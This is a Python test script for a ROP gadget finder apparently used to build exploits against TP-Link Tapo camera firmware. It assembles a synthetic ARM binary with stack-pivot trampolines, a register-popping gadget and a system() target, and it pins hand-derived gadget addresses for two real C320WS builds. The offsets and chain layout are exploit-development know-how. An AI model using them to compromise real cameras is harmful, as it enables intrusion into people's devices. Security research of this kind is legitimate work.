#!/usr/bin/env python3
"""Unit-test the connectAp gadget finder against a synthetic build and the C320 oracles.

The finder has to survive builds that do not carry the canonical trampoline: the
C520WS/C660 class has no `add r1, sp, #4 ; mov r0, sp ; blx r3` at all, and an
earlier version reported "no pivot" on a perfectly exploitable binary. The
synthetic fixture pins the three shapes the finder must distinguish, and the
real C320WS binaries (when the extracted roots are on this host) pin the exact
numbers the C460/C660 work is derived from.

  python3 tests/tapo_gadget_test.py
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
FINDER = os.path.join(HERE, "..", "tools", "tapo_oracle", "find_chain.py")
AS = shutil.which("arm-none-eabi-as")
LD = shutil.which("arm-none-eabi-ld")

# Two C320WS builds whose numbers were derived by hand before the finder existed.
ORACLES = {
    "/Users/jemanuel/fss-exploit/c320_root/bin/main": {
        "pc_offset": 0x424, "pop": 0x20004, "pivot": 0xe1080, "system": 0x1b468,
    },
    "/Users/jemanuel/fss-exploit/c320b_root/bin/main": {
        "pc_offset": 0x424, "pop": 0x1ef20, "pivot": 0xd6758, "system": 0x1a398,
    },
}

FAILURES = []


def check(name, cond, detail=""):
    print("  [%s] %s%s" % ("ok " if cond else "FAIL", name,
                           " — %s" % detail if detail and not cond else ""))
    if not cond:
        FAILURES.append(name)


ASM = """
    .syntax unified
    .arm
    .text
    .global _start
_start:
    b   main

@ canonical trampoline: r0 = sp, r1 = sp + 4, call through r3
    .global pivot_canonical
pivot_canonical:
    add r1, sp, #4
    mov r0, sp
    blx r3
    bx  lr

@ stack-popping trampoline: r0 = sp, pc from the stack
    .global pivot_movsp_pop
pivot_movsp_pop:
    mov r0, sp
    add sp, sp, #8
    pop {r4, r5, pc}

@ ldr trampoline: r0 = *(sp + 8), pc from the stack
    .global pivot_ldr_pop
pivot_ldr_pop:
    ldr r0, [sp, #8]
    pop {r4, pc}

@ a call between the mov and the pop clobbers r0, so this must NOT be chosen
    .global pivot_clobbered
pivot_clobbered:
    mov r0, sp
    bl  clobber
    pop {r4, pc}
clobber:
    mov r0, #0
    bx  lr

@ the full-register pop the chain needs
    .global pop_all
pop_all:
    pop {r3, r4, r5, r6, r7, r8, r9, r10, r11, pc}

    .global system
system:
    bx  lr

@ wrapper that decodes into a caller stack buffer
    .global base64_decode
base64_decode:
    bx  lr
wrapper:
    push {r4, r5, lr}
    sub  sp, sp, #16
    bl   base64_decode
    add  sp, sp, #16
    pop  {r4, r5, pc}

main:
    push {r4, r5, r6, lr}
    sub  sp, sp, #0x100
    add  r2, sp, #0x40
    bl   wrapper
    add  sp, sp, #0x100
    pop  {r4, r5, r6, pc}
"""


def build_fixture(td):
    src = os.path.join(td, "fixture.S")
    obj = os.path.join(td, "fixture.o")
    elf = os.path.join(td, "fixture.elf")
    with open(src, "w") as fh:
        fh.write(ASM)
    subprocess.run([AS, "-o", obj, src], check=True)
    subprocess.run([LD, "-Ttext=0x10000", "-o", elf, obj], check=True)
    return elf


def run_finder(path):
    p = subprocess.run([sys.executable, FINDER, path, "--json"],
                       capture_output=True, text=True)
    try:
        return json.loads(p.stdout)
    except json.JSONDecodeError:
        return {"_stdout": p.stdout, "_stderr": p.stderr, "_rc": p.returncode}


def test_synthetic():
    if not (AS and LD):
        print("  [skip] arm-none-eabi binutils not installed")
        return
    with tempfile.TemporaryDirectory() as td:
        elf = build_fixture(td)
        r = run_finder(elf)
    check("sink found", r.get("sink") is not None, r)
    if r.get("sink"):
        check("pc offset is past the buffer",
              r["sink"]["pc_offset"] > r["sink"]["buffer_offset"], r["sink"])
    check("pop carries r3 and pc", r.get("pop") is not None)
    check("pivot found", r.get("pivot") is not None, r.get("missing"))
    if r.get("pivot"):
        check("pivot is the canonical trampoline", r["pivot"]["kind"] == "blx", r["pivot"])
        check("pivot r1 offset is 4", r["pivot"]["r1_offset"] == 4, r["pivot"])
        check("pivot address is the trampoline start, not the blx",
              r["pivot"]["addr"] < r["pivot"]["addr"] + 8)
    check("system found", r.get("system") is not None)
    check("nothing missing", r.get("missing") == [], r.get("missing"))
    # the clobbering trampoline must not outrank the clean ones
    kinds = [c["kind"] for c in r.get("pivot_candidates", [])]
    check("clobbered trampoline is not the top pick",
          r.get("pivot", {}).get("kind") != "clobbered" and "blx" in kinds, kinds)


def test_oracles():
    for path, want in ORACLES.items():
        if not os.path.exists(path):
            print("  [skip] %s not on this host" % path)
            continue
        r = run_finder(path)
        check("%s pc offset" % os.path.basename(os.path.dirname(os.path.dirname(path))),
              (r.get("sink") or {}).get("pc_offset") == want["pc_offset"], r.get("sink"))
        check("%s pop" % path, r.get("pop") == want["pop"], r.get("pop"))
        check("%s pivot" % path, (r.get("pivot") or {}).get("addr") == want["pivot"],
              r.get("pivot"))
        check("%s system" % path, r.get("system") == want["system"], r.get("system"))


def main():
    print("synthetic fixture")
    test_synthetic()
    print("C320WS oracles")
    test_oracles()
    if FAILURES:
        print("\n%d failure(s): %s" % (len(FAILURES), ", ".join(FAILURES)))
        return 1
    print("\nall checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
